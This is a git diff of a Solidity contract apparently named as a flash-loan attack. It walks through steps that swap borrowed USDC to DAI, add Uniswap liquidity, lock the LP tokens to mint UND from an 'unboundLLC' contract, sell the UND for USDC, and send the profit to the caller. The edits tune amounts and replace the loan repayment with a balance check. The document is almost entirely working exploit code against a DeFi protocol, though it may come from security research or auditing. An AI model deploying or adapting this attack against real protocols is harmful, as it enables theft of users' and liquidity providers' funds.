@@ -62,10 +62,10 @@ contract pseudoFlashloanAttack1 {
     }    
 
     function flashLoanAttack(address loanReceiver) public {
-        require(usdc.balanceOf(address(this)) >= 2000000 * (10 ** 6), "This Contract must contain 2M USDC");
+        require(usdc.balanceOf(address(this)) == 2000000 * (10 ** 6), "This Contract must contain 2M USDC");
 
         // Flashloan logic
-
+        
         // step 1: attacker converts 500k USDC to DAI via UNISWAP
         usdc.approve(router, 500000 * (10 ** 6));
         address[] memory _path = new address[](2);
@@ -78,44 +78,48 @@ contract pseudoFlashloanAttack1 {
             address(this),  // receiver (this address)
             block.timestamp + 120  // 2 min wait time
         );
-
+        
         // step 2: Add liquidity 1.5M USDC and 500k DAI
-        usdc.approve(router, 1500000 * (10 ** 6));
-        dai.approve(router, 500000 * (10 ** 18));
+        uint currentBalUSDC = usdc.balanceOf(address(this));
+        uint currentBalDAI = dai.balanceOf(address(this));
+        usdc.approve(router, currentBalUSDC);
+        dai.approve(router, currentBalDAI);
         uniswapRouter.addLiquidity(
             usdcAddr,
             daiAddr,
-            1500000 * (10 ** 6),
-            1500000 * (10 ** 18),
-            500000 * (10 ** 6),
-            500000 * (10 ** 18),
+            currentBalUSDC,
+            currentBalDAI,
+            150000 * (10 ** 6),
+            50000 * (10 ** 18),
             address(this),
             block.timestamp + 120
         );
-
+        
         // step 3: Attacker locks the LP tokens from step 2 and mints 2.25M UND (minus fee)
         uint LPTokens = USDCDAIPair.balanceOf(address(this));
         USDCDAIPair.approve(LLCAddr, LPTokens);
-        unboundLLC.lockLPT(LPTokens, 20000 * (10 ** 18));
-
+        unboundLLC.lockLPT(LPTokens, 1 * (10 ** 18));
+        
         // step 4: Attacker buys 2.25M USDC from UND/USDC pool
         uint UndBalance = und.balanceOf(address(this));
         und.approve(router, UndBalance);
         address[] memory _path2 = new address[](2);
         _path2[0] = undAddr;
         _path2[1] = usdcAddr;
+        
         uniswapRouter.swapExactTokensForTokens(
             UndBalance, // supposed to be 2.25M UND
-            22000 * (10 ** 6), // minimum amt. Change this if something not working
+            2200 * (10 ** 6), // minimum amt. Change this if something not working
             _path2,
             address(this),  // receiver (this address)
             block.timestamp + 120  // 2 min wait time
         );
         
-
+        
         // step 5: Pay back 2M USDC loan (+ fees)
-        require(usdc.transfer(loanReceiver, 2000000 * (10 ** 6)), "Insufficient USDC? FlashLoan failed");
-
+        // require(usdc.transfer(loanReceiver, 2000000 * (10 ** 6)), "Insufficient USDC? FlashLoan failed");
+        require(usdc.balanceOf(address(this)) >= 2000000 * (10 ** 6), "Not enough USDC. Flash Loan would Fail");
+        
         // step 6: Send any profits to msg.sender
         uint USDCbal = usdc.balanceOf(address(this));
         usdc.transfer(msg.sender, USDCbal);
